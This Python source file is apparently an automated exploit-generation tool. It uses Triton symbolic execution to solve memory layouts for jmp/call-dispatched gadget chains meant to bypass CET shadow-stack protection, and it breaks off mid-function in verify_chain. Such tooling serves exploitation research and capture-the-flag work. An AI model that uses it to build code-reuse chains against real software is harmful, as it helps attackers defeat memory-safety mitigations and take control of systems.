"""
solve_no_ret_mem.py
Extended from solve_pivot_mem.py for CET-SS bypass (no-ret gadget chains).

Strategy:
  1. Allocate a virtual memory region for dispatch pointers (avoid conflicts with data slots)
  2. Phase 1: Concrete execution to determine dispatch layout using virtual memory
  3. Phase 2: Symbolic execution with virtual dispatch slots concrete, data slots symbolic
  4. Phase 3: Map virtual addresses back to actual controllable memory offsets
"""

from triton import TritonContext, ARCH, MemoryAccess, CPUSIZE, Instruction
from pwn import *
from itertools import product
context.arch = 'amd64'
import multiprocessing
from functools import partial
import time
import re
import tools
from keystone import Ks, KS_ARCH_X86, KS_MODE_64
Ks_engine = Ks(KS_ARCH_X86, KS_MODE_64)

# Virtual memory region for dispatch pointers (same convention as solve_engine.py)
VIRTUAL_MEM_BASE = 0x8ffffff00000
VIRTUAL_MEM_SIZE = 0x10000
INITIAL_OBJECT_BASE_BIAS_SLOTS = 10

def my_asm(gadget):
    return bytes(Ks_engine.asm(gadget)[0])

def get_reg(ctx, reg_name):
    for reg in ctx.getAllRegisters():
        if reg.getName() == reg_name:
            return reg

def init_reg(ctx, regs):
    for reg, v in regs.items():
        if reg not in ['fs_base', 'gs_base']:
            ctx.setConcreteRegisterValue(get_reg(ctx, reg), v)
    return ctx

def table_check(addr, permission_table, mode):
    for i in range(len(permission_table)):
        if addr >= permission_table[i]['start'] and addr < permission_table[i]['end']:
            if mode in permission_table[i]['permission']:
                return True
    return False

def read_write_check(instruction, permission_table):
    if instruction.isMemoryRead():
        a = instruction.getLoadAccess()
        readMemory = a[0][0].getAddress()
        if not table_check(readMemory, permission_table, 'r'):
            return False
    if instruction.isMemoryWrite():
        b = instruction.getStoreAccess()
        writeMemory = b[0][0].getAddress()
        if not table_check(writeMemory, permission_table, 'w'):
            return False
    return True


def eval_mem_expr(ctx, expr):
    """Evaluate a memory expression like 'rsi + 0x10' using current register values."""
    parts = expr.strip().split(' ')
    if len(parts) == 1:
        try:
            return ctx.getConcreteRegisterValue(get_reg(ctx, parts[0]))
        except:
            return None
    elif len(parts) == 3:
        reg_name, op, val_str = parts
        try:
            offset = int(val_str, 16) if '0x' in val_str else int(val_str)
            reg_val = ctx.getConcreteRegisterValue(get_reg(ctx, reg_name))
        except:
            return None
        if op == '+':
            return (reg_val + offset) & 0xffffffffffffffff
        elif op == '-':
            return (reg_val - offset) & 0xffffffffffffffff
    return None


def parse_mem_expr_base_offset(expr):
    """Parse a simple memory expression into (base_reg, expr_offset)."""
    parts = expr.strip().split(' ')
    if len(parts) == 1:
        return parts[0], 0
    if len(parts) == 3:
        base_reg = parts[0]
        try:
            expr_offset = int(parts[2], 16) if '0x' in parts[2] else int(parts[2])
        except:
            return None, None
        if parts[1] == '-':
            expr_offset = -expr_offset
        elif parts[1] != '+':
            return None, None
        return base_reg, expr_offset
    return None, None


def _controllable_offset_set(offset_list):
    return set(offset_list)


def build_sparse_real_base_candidates(controble_addr_base, offset_list, concrete_mem,
                                      min_empty_follow=30, base_bias_slots=6):
    """
    Prefer already-materialized controllable slots whose following window stays empty.
    These addresses are better object-like bases for later sequential steps because
    dereferences such as [reg + 0x20] / [reg + 0x28] are less likely to collide with
    previously committed memory.
    """
    if not concrete_mem:
        return []

    offset_set = _controllable_offset_set(offset_list)
    used_offsets = set()
    for addr in concrete_mem:
        if is_real_controllable_addr(addr, controble_addr_base, offset_list):
            used_offsets.add((addr - controble_addr_base) // 8)

    candidates = []
    for off in sorted(used_offsets):
        if off not in offset_set:
            continue
        base_off = off + base_bias_slots
        if base_off not in offset_set or base_off in used_offsets:
            continue
        ok = True
        for delta in range(1, min_empty_follow + 1):
            next_off = off + delta
            if next_off not in offset_set or next_off in used_offsets:
                ok = False
                break
        if ok:
            candidates.append(controble_addr_base + base_off * 8)
    return candidates


def build_real_dispatch_candidates(expr_offset, controble_addr_base, offset_list,
                                   concrete_mem=None, min_empty_follow=30,
                                   base_bias_slots=6):
    """
    Enumerate real controllable dispatch addresses to try before falling back to
    virtual memory. Prefer candidates whose base register value also stays in
    controllable memory, starting from the controllable base itself.
    """
    candidates = []
    seen = set()

    if not concrete_mem:
        preferred_base = controble_addr_base + INITIAL_OBJECT_BASE_BIAS_SLOTS * 8
        preferred_dispatch = (preferred_base + expr_offset) & 0xffffffffffffffff
        if is_real_controllable_addr(preferred_dispatch, controble_addr_base, offset_list):
            candidates.append(preferred_dispatch)
            seen.add(preferred_dispatch)

    if concrete_mem:
        for base_addr in build_sparse_real_base_candidates(
                controble_addr_base, offset_list, concrete_mem,
                min_empty_follow=min_empty_follow,
                base_bias_slots=base_bias_slots):
            dispatch_addr = (base_addr + expr_offset) & 0xffffffffffffffff
            if (dispatch_addr not in seen and
                    is_real_controllable_addr(dispatch_addr, controble_addr_base, offset_list)):
                candidates.append(dispatch_addr)
                seen.add(dispatch_addr)

    preferred_dispatch = (controble_addr_base + expr_offset) & 0xffffffffffffffff
    preferred_base = (preferred_dispatch - expr_offset) & 0xffffffffffffffff
    if (is_real_controllable_addr(preferred_dispatch, controble_addr_base, offset_list) and
            is_real_controllable_addr(preferred_base, controble_addr_base, offset_list)):
        candidates.append(preferred_dispatch)
        seen.add(preferred_dispatch)

    for off in offset_list:
        dispatch_addr = controble_addr_base + off * 8
        base_value = (dispatch_addr - expr_offset) & 0xffffffffffffffff
        if (dispatch_addr not in seen and
                is_real_controllable_addr(base_value, controble_addr_base, offset_list)):
            candidates.append(dispatch_addr)
            seen.add(dispatch_addr)

    for off in offset_list:
        dispatch_addr = controble_addr_base + off * 8
        if dispatch_addr not in seen:
            candidates.append(dispatch_addr)
            seen.add(dispatch_addr)

    return candidates


def pick_preferred_terminal_dispatch_addr(expr_offset, controble_addr_base, offset_list,
                                          concrete_mem, min_empty_follow=30,
                                          base_bias_slots=6):
    if not concrete_mem:
        preferred_base = controble_addr_base + INITIAL_OBJECT_BASE_BIAS_SLOTS * 8
        dispatch_addr = (preferred_base + expr_offset) & 0xffffffffffffffff
        if is_real_controllable_addr(dispatch_addr, controble_addr_base, offset_list):
            return dispatch_addr

    for base_addr in build_sparse_real_base_candidates(
            controble_addr_base, offset_list, concrete_mem,
            min_empty_follow=min_empty_follow,
            base_bias_slots=base_bias_slots):
        dispatch_addr = (base_addr + expr_offset) & 0xffffffffffffffff
        if (is_real_controllable_addr(dispatch_addr, controble_addr_base, offset_list) and
                dispatch_addr not in concrete_mem):
            return dispatch_addr
    return pick_free_real_addr_high(controble_addr_base, offset_list, concrete_mem)


TRACKED_REG_NAMES = [
    'rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi',
    'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11',
    'r12', 'r13', 'r14', 'r15', 'rip', 'eflags',
    'cs', 'ss', 'ds', 'es', 'fs', 'gs'
]

MOV_LIKE_OPS = {'mov', 'movzx', 'movsxd', 'movsx', 'movabs'}


def clone_ctx(src_ctx):
    """Clone register state from one Triton context into a fresh context."""
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    for reg in src_ctx.getAllRegisters():
        try:
            ctx.setConcreteRegisterValue(reg, src_ctx.getConcreteRegisterValue(reg))
        except:
            pass
    return ctx


def seed_memory(ctx, concrete_mem, virtual_alloc):
    for addr, val in concrete_mem.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))
    for addr, val in virtual_alloc.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))


def snapshot_regs(ctx):
    regs = {}
    for rn in TRACKED_REG_NAMES:
        reg = get_reg(ctx, rn)
        if reg:
            regs[rn] = ctx.getConcreteRegisterValue(reg)
    return regs


def ctx_from_regs(regs):
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    return init_reg(ctx, regs)


def eval_mem_expr_from_regs(regs, expr):
    """Evaluate a simple memory expression using a register snapshot."""
    parts = expr.strip().split(' ')
    if len(parts) == 1:
        return regs.get(parts[0])
    if len(parts) == 3:
        reg_name, op, val_str = parts
        reg_val = regs.get(reg_name)
        if reg_val is None:
            return None
        try:
            offset = int(val_str, 16) if '0x' in val_str else int(val_str)
        except:
            return None
        if op == '+':
            return (reg_val + offset) & 0xffffffffffffffff
        if op == '-':
            return (reg_val - offset) & 0xffffffffffffffff
    return None


def is_real_controllable_addr(addr, controble_addr_base, offset_list):
    if addr is None:
        return False
    return (addr >= controble_addr_base and
            addr < controble_addr_base + len(offset_list) * 8)


def pick_free_real_addr(controble_addr_base, offset_list, concrete_mem):
    """Pick a free controllable qword slot for an intermediate pointer."""
    for off in offset_list:
        addr = controble_addr_base + off * 8
        if addr not in concrete_mem:
            return addr
    return None


def pick_free_real_addr_high(controble_addr_base, offset_list, concrete_mem):
    """Pick a free controllable qword slot, preferring high offsets."""
    for off in reversed(offset_list):
        addr = controble_addr_base + off * 8
        if addr not in concrete_mem:
            return addr
    return None


def assign_concrete_qword(concrete_mem, addr, value):
    """Assign a concrete qword if it does not conflict with an existing value."""
    old = concrete_mem.get(addr)
    value = value & 0xffffffffffffffff
    if old is not None and old != value:
        return False
    concrete_mem[addr] = value
    return True


def execute_with_trace(body_insts, start_ctx, concrete_mem, virtual_alloc, address_base):
    """
    Execute instructions from a starting context and capture the register state
    immediately before each instruction. The trace is used to recursively
    synthesize pointer chains for indirect dispatch.
    """
    ctx = clone_ctx(start_ctx)
    seed_memory(ctx, concrete_mem, virtual_alloc)

    trace = []
    address = address_base
    for inst_str in body_insts:
        op_info = tools.Analysis_op(inst_str)
        trace.append({
            'inst': inst_str,
            'op_info': op_info,
            'before_regs': snapshot_regs(ctx),
            'address': address,
        })
        code = my_asm(inst_str)
        instruction = Instruction(address, code)
        ctx.processing(instruction)
        address += len(code)
    return trace, ctx


def iter_op_writes(op_info):
    if op_info is None:
        return []
    if isinstance(op_info, list):
        return op_info
    return [op_info]


def find_last_write(trace, reg_name):
    """Return (index, op_info_item) for the last write to reg_name in a trace."""
    for idx in range(len(trace) - 1, -1, -1):
        for item in reversed(iter_op_writes(trace[idx]['op_info'])):
            if (item.get('dst', {}).get('type') == 'value' and
                item['dst'].get('reg_name') == reg_name):
                return idx, item
    return None, None


def materialize_expr_address(body_insts, start_ctx, concrete_mem, virtual_alloc,
                             controble_addr_base, offset_list,
                             expr, desired_addr, address_base=0x400000, depth=0):
    """Force a simple memory expression to evaluate to a chosen controllable address."""
    if depth > 16:
        return False, set()

    trace, final_ctx = execute_with_trace(
        body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
    current_regs = snapshot_regs(final_ctx)
    current_addr = eval_mem_expr_from_regs(current_regs, expr)
    if current_addr == desired_addr:
        return True, set()

    parts = expr.strip().split(' ')
    if len(parts) == 1:
        desired_reg = desired_addr
        base_reg = parts[0]
    elif len(parts) == 3:
        base_reg, op, val_str = parts
        try:
            offset = int(val_str, 16) if '0x' in val_str else int(val_str)
        except:
            return False, set()
        if op == '+':
            desired_reg = (desired_addr - offset) & 0xffffffffffffffff
        elif op == '-':
            desired_reg = (desired_addr + offset) & 0xffffffffffffffff
        else:
            return False, set()
    else:
        return False, set()

    ok, _, used_addrs = materialize_reg_value(
        body_insts, start_ctx, concrete_mem, virtual_alloc,
        controble_addr_base, offset_list,
        base_reg, desired_reg, address_base=address_base, depth=depth + 1)
    return ok, used_addrs


def materialize_reg_value(body_insts, start_ctx, concrete_mem, virtual_alloc,
                          controble_addr_base, offset_list,
                          reg_name, desired_value, address_base=0x400000, depth=0):
    """
    Recursively synthesize concrete controllable-memory assignments so that
    reg_name has desired_value after executing body_insts from start_ctx.

    Returns:
        (success, terminal_load_addr, used_real_addrs)
        terminal_load_addr is the controllable slot whose value is loaded
        directly into reg_name (if any).
    """
    if depth > 16:
        return False, None, set()

    trace, final_ctx = execute_with_trace(
        body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
    reg = get_reg(final_ctx, reg_name)
    if reg is None:
        return False, None, set()
    current_value = final_ctx.getConcreteRegisterValue(reg)
    desired_value &= 0xffffffffffffffff
    if current_value == desired_value:
        return True, None, set()

    idx, write_info = find_last_write(trace, reg_name)
    if idx is None:
        return False, None, set()

    prefix_insts = body_insts[:idx]
    op = write_info['op']
    used_addrs = set()

    if op in MOV_LIKE_OPS and write_info['src']['type'] == 'mem_value':
        expr = write_info['src']['expr']
        load_addr = eval_mem_expr_from_regs(trace[idx]['before_regs'], expr)
        if not is_real_controllable_addr(load_addr, controble_addr_base, offset_list):
            desired_load_addr = None
            if is_real_controllable_addr(
                    desired_value, controble_addr_base, offset_list):
                desired_load_addr = desired_value
                existing = concrete_mem.get(desired_load_addr)
                if existing is not None and existing != desired_value:
                    desired_load_addr = None

            if desired_load_addr is None:
                desired_load_addr = pick_free_real_addr(
                    controble_addr_base, offset_list, concrete_mem)
            if desired_load_addr is None:
                return False, None, set()
            ok, addr_chain = materialize_expr_address(
                prefix_insts, start_ctx, concrete_mem, virtual_alloc,
                controble_addr_base, offset_list, expr, desired_load_addr,
                address_base=address_base, depth=depth + 1)
            if not ok:
                return False, None, set()
            used_addrs |= addr_chain

            trace, final_ctx = execute_with_trace(
                body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
            load_addr = eval_mem_expr_from_regs(trace[idx]['before_regs'], expr)
            if not is_real_controllable_addr(load_addr, controble_addr_base, offset_list):
                return False, None, set()

        if not assign_concrete_qword(concrete_mem, load_addr, desired_value):
            return False, None, set()
        used_addrs.add(load_addr)

        _, verify_ctx = execute_with_trace(
            body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
        if verify_ctx.getConcreteRegisterValue(get_reg(verify_ctx, reg_name)) != desired_value:
            return False, None, set()
        return True, load_addr, used_addrs

    if op in MOV_LIKE_OPS and write_info['src']['type'] == 'value':
        src_reg = write_info['src']['reg_name']
        if not isinstance(src_reg, str):
            return False, None, set()
        ok, terminal_addr, addr_chain = materialize_reg_value(
            prefix_insts, start_ctx, concrete_mem, virtual_alloc,
            controble_addr_base, offset_list,
            src_reg, desired_value, address_base=address_base, depth=depth + 1)
        if not ok:
            return False, None, set()
        used_addrs |= addr_chain

        _, verify_ctx = execute_with_trace(
            body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
        if verify_ctx.getConcreteRegisterValue(get_reg(verify_ctx, reg_name)) != desired_value:
            return False, None, set()
        return True, terminal_addr, used_addrs

    if op == 'lea':
        expr = write_info['src']['expr']
        ok, addr_chain = materialize_expr_address(
            prefix_insts, start_ctx, concrete_mem, virtual_alloc,
            controble_addr_base, offset_list, expr, desired_value,
            address_base=address_base, depth=depth + 1)
        if not ok:
            return False, None, set()
        used_addrs |= addr_chain

        _, verify_ctx = execute_with_trace(
            body_insts, start_ctx, concrete_mem, virtual_alloc, address_base)
        if verify_ctx.getConcreteRegisterValue(get_reg(verify_ctx, reg_name)) != desired_value:
            return False, None, set()
        return True, None, used_addrs

    if write_info['src']['type'] == 'num':
        if write_info['src']['value'] == desired_value:
            return True, None, set()

    return False, None, set()


def find_data_load_for_reg(body_insts, reg_name, regs_init, controble_addr_base, exec_ctx=None):
    """
    Check if a register is loaded from controllable memory in the body instructions.
    Returns source_offset if found, else None.

    If exec_ctx is provided, use it as the starting register state (reflects
    rsp shifts from prior call instructions). Otherwise use regs_init.
    """
    if exec_ctx is not None:
        # Build a regs dict from the execution context
        ctx = TritonContext()
        ctx.setArchitecture(ARCH.X86_64)
        for reg in exec_ctx.getAllRegisters():
            try:
                ctx.setConcreteRegisterValue(reg, exec_ctx.getConcreteRegisterValue(reg))
            except:
                pass
    else:
        ctx = TritonContext()
        ctx.setArchitecture(ARCH.X86_64)
        ctx = init_reg(ctx, regs_init)

    for inst_str in body_insts:
        op_info = tools.Analysis_op(inst_str)
        if op_info and type(op_info) != list:
            if (op_info['op'] in ['mov', 'movzx', 'movsxd', 'movsx'] and
                op_info['dst']['type'] == 'value' and
                op_info['dst']['reg_name'] == reg_name and
                op_info['src']['type'] == 'mem_value'):
                expr = op_info['src']['expr']
                load_addr = eval_mem_expr(ctx, expr)
                if load_addr is not None and load_addr >= controble_addr_base:
                    src_offset = (load_addr - controble_addr_base) // 8
                    return src_offset
        try:
            code = my_asm(inst_str)
            instruction = Instruction(0x400000, code)
            ctx.processing(instruction)
        except:
            pass
    return None


def analyze_dispatch_with_virtual_mem(gadget_chain_tuple, regs_init, controble_addr_base, offset_list):
    """
    Phase 1: Determine dispatch layout using virtual memory for indirect pointers.

    For each gadget's tail (jmp/call [reg+off]):
      - If the dispatch address is directly in controllable memory, record it.
      - Otherwise recursively materialize the tail base register through the
        gadget body, allowing multi-hop pointer chains such as:
          [ctrl + a] -> ptr1 ; [ptr1] -> ptr2 ; call [ptr2 + off]
        The final dispatch target still lives in virtual memory so it does not
        steal ordinary data slots from the SMT phase.

    Returns:
        (dispatch_info, virtual_alloc) or (None, None)
        dispatch_info: list of dicts per gadget with dispatch details
        virtual_alloc: {virtual_addr: next_gadget_addr} - virtual memory assignments
    """
    gadget_addrs = []
    for g_str in gadget_chain_tuple:
        gadget_addrs.append(int(g_str.split(' -> ')[0], 16))

    # Track all memory assignments: {absolute_addr: value}
    concrete_mem = {}
    virtual_alloc = {}  # {virtual_addr: value}
    virtual_ptr = VIRTUAL_MEM_BASE  # next free virtual address
    dispatch_info = []  # per-gadget dispatch info

    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        body_insts = insts[:-1]
        tail_inst = insts[-1]
        address = 0x400000 + g_idx * 0x1000
        start_ctx = clone_ctx(ctx)
        try:
            _, ctx = execute_with_trace(
                body_insts, start_ctx, concrete_mem, virtual_alloc, address)
            body_end_address = address
            for inst_str in body_insts:
                body_end_address += len(my_asm(inst_str))
        except:
            return None, None

        info = {'g_idx': g_idx, 'type': 'last'}

        if g_idx < len(gadget_chain_tuple) - 1:
            next_addr = gadget_addrs[g_idx + 1]
            tail_op = tail_inst.split(' ')[0]
            operand = tail_inst[len(tail_op) + 1:]
            reg_info = tools.Analysis_reg(operand)

            if reg_info['type'] == 'mem_value':
                expr = reg_info['expr']
                dispatch_addr = eval_mem_expr(ctx, expr)

                if (dispatch_addr is not None and
                    dispatch_addr >= controble_addr_base and
                    dispatch_addr < controble_addr_base + len(offset_list) * 8):
                    # Direct dispatch in controllable memory
                    if not assign_concrete_qword(concrete_mem, dispatch_addr, next_addr):
                        return None, None
                    ctx.setConcreteMemoryAreaValue(dispatch_addr, p64(next_addr))
                    info = {
                        'g_idx': g_idx, 'type': 'direct',
                        'dispatch_addr': dispatch_addr,
                        'dispatch_offset': (dispatch_addr - controble_addr_base) // 8,
                        'value': next_addr
                    }
                else:
                    # Indirect dispatch: first try to realize the tail target in
                    # real controllable memory, then fall back to virtual memory.
                    base_reg, expr_offset = parse_mem_expr_base_offset(expr)
                    if base_reg is None:
                        return None, None

                    realized = False
                    for real_dispatch_addr in build_real_dispatch_candidates(
                            expr_offset, controble_addr_base, offset_list,
                            concrete_mem=concrete_mem):
                        cand_concrete = dict(concrete_mem)
                        cand_virtual = dict(virtual_alloc)
                        base_reg_value = (real_dispatch_addr - expr_offset) & 0xffffffffffffffff
                        ok, src_addr, chain_addrs = materialize_reg_value(
                            body_insts, start_ctx, cand_concrete, cand_virtual,
                            controble_addr_base, offset_list,
                            base_reg, base_reg_value,
                            address_base=address)
                        if not ok:
                            continue
                        if not assign_concrete_qword(cand_concrete, real_dispatch_addr, next_addr):
                            continue

                        try:
                            _, cand_ctx = execute_with_trace(
                                body_insts, start_ctx, cand_concrete, cand_virtual, address)
                            cand_dispatch_addr = eval_mem_expr(cand_ctx, expr)
                            if cand_dispatch_addr != real_dispatch_addr:
                                continue
                            cand_body_end = address
                            for inst_str in body_insts:
                                cand_body_end += len(my_asm(inst_str))
                        except:
                            continue

                        concrete_mem = cand_concrete
                        virtual_alloc = cand_virtual
                        ctx = cand_ctx
                        body_end_address = cand_body_end
                        info = {
                            'g_idx': g_idx,
                            'type': 'materialized_direct',
                            'dispatch_addr': real_dispatch_addr,
                            'dispatch_offset': (real_dispatch_addr - controble_addr_base) // 8,
                            'value': next_addr,
                            'base_reg': base_reg,
                            'base_reg_value': base_reg_value,
                            'expr_offset': expr_offset,
                            'pointer_offsets': sorted(
                                (a - controble_addr_base) // 8
                                for a in chain_addrs
                                if is_real_controllable_addr(a, controble_addr_base, offset_list)
                            ),
                        }
                        if src_addr is not None and is_real_controllable_addr(
                                src_addr, controble_addr_base, offset_list):
                            info['src_addr'] = src_addr
                            info['src_offset'] = (src_addr - controble_addr_base) // 8
                        realized = True
                        break

                    if not realized:
                        base_reg_value = (virtual_ptr - expr_offset) & 0xffffffffffffffff
                        ok, src_addr, chain_addrs = materialize_reg_value(
                            body_insts, start_ctx, concrete_mem, virtual_alloc,
                            controble_addr_base, offset_list,
                            base_reg, base_reg_value,
                            address_base=address)
                        if not ok or src_addr is None:
                            return None, None

                        virtual_alloc[virtual_ptr] = next_addr

                        ctx.setConcreteMemoryAreaValue(virtual_ptr, p64(next_addr))

                        info = {
                            'g_idx': g_idx, 'type': 'indirect',
                            'src_offset': (src_addr - controble_addr_base) // 8,
                            'src_addr': src_addr,
                            'base_reg': base_reg,
                            'base_reg_value': base_reg_value,
                            'virtual_ptr': virtual_ptr,
                            'value': next_addr,
                            'expr_offset': expr_offset,
                            'pointer_offsets': sorted(
                                (a - controble_addr_base) // 8
                                for a in chain_addrs
                                if is_real_controllable_addr(a, controble_addr_base, offset_list)
                            ),
                        }
                        virtual_ptr += 8

                        try:
                            _, ctx = execute_with_trace(
                                body_insts, start_ctx, concrete_mem, virtual_alloc, address)
                            body_end_address = address
                            for inst_str in body_insts:
                                body_end_address += len(my_asm(inst_str))
                        except:
                            return None, None
        else:
            tail_op = tail_inst.split(' ')[0]
            operand = tail_inst[len(tail_op) + 1:] if ' ' in tail_inst else ''
            reg_info = tools.Analysis_reg(operand) if operand else None

            if reg_info and reg_info.get('type') == 'mem_value':
                expr = reg_info['expr']
                dispatch_addr = eval_mem_expr(ctx, expr)

                if not is_real_controllable_addr(
                        dispatch_addr, controble_addr_base, offset_list):
                    base_reg, expr_offset = parse_mem_expr_base_offset(expr)
                    if base_reg is None:
                        return None, None

                    dispatch_addr = pick_preferred_terminal_dispatch_addr(
                        expr_offset, controble_addr_base, offset_list, concrete_mem)
                    if dispatch_addr is None:
                        return None, None
                    if not assign_concrete_qword(concrete_mem, dispatch_addr, 0):
                        return None, None

                    base_reg_value = (dispatch_addr - expr_offset) & 0xffffffffffffffff
                    ok, src_addr, chain_addrs = materialize_reg_value(
                        body_insts, start_ctx, concrete_mem, virtual_alloc,
                        controble_addr_base, offset_list,
                        base_reg, base_reg_value,
                        address_base=address)
                    if not ok:
                        return None, None

                    info = {
                        'g_idx': g_idx, 'type': 'terminal_indirect',
                        'dispatch_addr': dispatch_addr,
                        'dispatch_offset': (dispatch_addr - controble_addr_base) // 8,
                        'src_addr': src_addr,
                        'base_reg': base_reg,
                        'base_reg_value': base_reg_value,
                        'expr_offset': expr_offset,
                        'pointer_offsets': sorted(
                            (a - controble_addr_base) // 8
                            for a in chain_addrs
                            if is_real_controllable_addr(a, controble_addr_base, offset_list)
                        ),
                    }

                    try:
                        _, ctx = execute_with_trace(
                            body_insts, start_ctx, concrete_mem, virtual_alloc, address)
                        body_end_address = address
                        for inst_str in body_insts:
                            body_end_address += len(my_asm(inst_str))
                    except:
                        return None, None

        dispatch_info.append(info)

        # Execute tail
        try:
            seed_memory(ctx, concrete_mem, virtual_alloc)
            code = my_asm(tail_inst)
            instruction = Instruction(body_end_address, code)
            ctx.processing(instruction)
        except:
            return None, None

    return dispatch_info, (concrete_mem, virtual_alloc)


def map_virtual_to_real(result_map, virtual_alloc, dispatch_info,
                        controble_addr_base, offset_list):
    """
    Phase 3: Map virtual dispatch addresses back to real controllable memory.

    For each entry in result_map whose value points to virtual memory:
      1. Allocate a free real controllable memory slot
      2. Store the virtual dispatch content (next gadget addr) in that real slot
      3. Update the pointer to point to the real slot (adjusting for expr_offset)

    Args:
        result_map: {offset: hex_value_str} - current memory layout
        virtual_alloc: {virtual_addr: gadget_addr} - virtual memory assignments
        dispatch_info: list of per-gadget dispatch info dicts
        controble_addr_base: base address of controllable memory
        offset_list: list of available offsets

    Returns:
        Updated result_map with virtual addresses replaced by real addresses
    """
    if not virtual_alloc:
        return result_map

    # Find used offsets
    used_offsets = set(result_map.keys())

    # Build reverse map: virtual_addr -> dispatch_info entry
    virtual_to_info = {}
    for info in dispatch_info:
        if info.get('type') == 'indirect':
            virtual_to_info[info['virtual_ptr']] = info

    # For each result_map entry pointing to virtual memory, remap
    remap_needed = []  # [(offset_in_map, virtual_base_value, dispatch_info_entry)]
    for off, val_str in list(result_map.items()):
        val = int(val_str, 16)
        # Check if this value falls in virtual memory range (possibly with expr_offset subtracted)
        for vaddr, info in virtual_to_info.items():
            expr_offset = info.get('expr_offset', 0)
            # The stored value is (virtual_ptr - expr_offset), i.e. base_reg_value
            expected_base = (vaddr - expr_offset) & 0xffffffffffffffff
            if val == expected_base:
                remap_needed.append((off, val, info))
                break

    if not remap_needed:
        return result_map

    # Allocate real slots for virtual dispatch content
    new_map = dict(result_map)
    for off, val, info in remap_needed:
        vaddr = info['virtual_ptr']
        gadget_addr = virtual_alloc[vaddr]
        expr_offset = info.get('expr_offset', 0)

        # Find a free offset for the dispatch content
        real_offset = None
        for candidate in offset_list:
            if candidate not in used_offsets:
                real_offset = candidate
                break
        if real_offset is None:
            continue  # no free slot, skip

        used_offsets.add(real_offset)
        real_addr = controble_addr_base + real_offset * 8

        # Store the next gadget address at the real slot
        new_map[real_offset] = hex(gadget_addr)

        # Update the pointer: base_reg should point to (real_addr - expr_offset)
        # so that [base_reg + expr_offset] = real_addr -> gadget_addr
        new_base_value = (real_addr - expr_offset) & 0xffffffffffffffff
        new_map[off] = hex(new_base_value)

    return new_map


def solve_chain(gadget_chain_tuple, regs_init, controble_addr_base, offset_list,
                permission_table, target_reg, target_value, locked_mem=None):
    """
    Full solver:
      1. Analyze dispatch with virtual memory
      2. Symbolic execution with dispatch concrete, data symbolic
      3. Solve and map back

    locked_mem: optional dict {offset: hex_value_str} of memory slots that must
                remain at their committed values (from earlier chain steps).
                These are set concrete and NOT symbolized.
    """
    result = analyze_dispatch_with_virtual_mem(
        gadget_chain_tuple, regs_init, controble_addr_base, offset_list)
    if result[0] is None:
        return None
    dispatch_info, (concrete_mem, virtual_alloc) = result

    # Collect concrete offsets (dispatch slots in controllable memory)
    concrete_offsets = {}  # {offset: value}
    for addr, val in concrete_mem.items():
        if addr >= controble_addr_base:
            off = (addr - controble_addr_base) // 8
            concrete_offsets[off] = val

    # Also treat locked_mem offsets as concrete
    locked_offsets = {}
    if locked_mem:
        for off, val_str in locked_mem.items():
            locked_offsets[off] = int(val_str, 16) & 0xffffffffffffffff

    # Extended permission table with virtual memory
    perm_ext = list(permission_table) + [
        {'start': VIRTUAL_MEM_BASE, 'end': VIRTUAL_MEM_BASE + VIRTUAL_MEM_SIZE, 'permission': 'rw'}
    ]

    # Phase 2: Symbolic execution
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    # Set concrete dispatch memory
    for addr, val in concrete_mem.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))
    for addr, val in virtual_alloc.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))

    # Set locked memory values concrete
    for off, val in locked_offsets.items():
        addr = controble_addr_base + off * 8
        ctx.setConcreteMemoryAreaValue(addr, p64(val))

    # Symbolize data slots (everything except dispatch and locked offsets)
    for i in offset_list:
        if i not in concrete_offsets and i not in locked_offsets:
            mem_addr = controble_addr_base + 8 * i
            memory_access = MemoryAccess(mem_addr, CPUSIZE.QWORD)
            ctx.symbolizeMemory(memory_access, f"mem_{i}")

    # Execute all gadgets
    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        address = 0x400000 + g_idx * 0x1000
        for inst_str in insts:
            try:
                code = my_asm(inst_str)
                instruction = Instruction(address, code)
                ctx.processing(instruction)
                address += len(code)
            except:
                return None

    # Solve
    target_ast = ctx.getRegisterAst(get_reg(ctx, target_reg))
    constraint = target_ast == (target_value & 0xffffffffffffffff)
    solution = ctx.getModel(constraint)

    if len(solution) == 0:
        return None

    # Build result map
    result_map = {}
    for off, val in concrete_offsets.items():
        result_map[off] = hex(val)
    for off, val in locked_offsets.items():
        result_map[off] = hex(val)

    for k, v in solution.items():
        var_name = str(v.getVariable()).split(':')[0]
        value = v.getValue()
        if "mem_" in var_name:
            idx = int(var_name.split("_")[1])
            result_map[idx] = hex(value)

    # Phase 3: Map virtual addresses back to real controllable memory
    result_map = map_virtual_to_real(result_map, virtual_alloc, dispatch_info,
                                     controble_addr_base, offset_list)

    return result_map


def verify_chain(regs_init, gadget_chain_tuple, controble_addr_base,
                 result_map, permission_table, target_reg, target_value):
    """Concrete execution to verify. result_map should contain only real addresses."""
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    for offset_idx, value_str in result_map.items():
        addr = controble_addr_base + offset_idx * 8
        val = int(value_str, 16) & 0xffffffffffffffff
        ctx.setConcreteMemoryAreaValue(addr, p64(val))

    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        address = 0x400000 + g_idx * 0x1000
        for inst_str in insts:
            try:
                code = my_asm(inst_str)
                instruction = Instruction(address, code)
                ctx.processing(instruction)
                if not read_write_check(instruction, permission_table):
                    return False
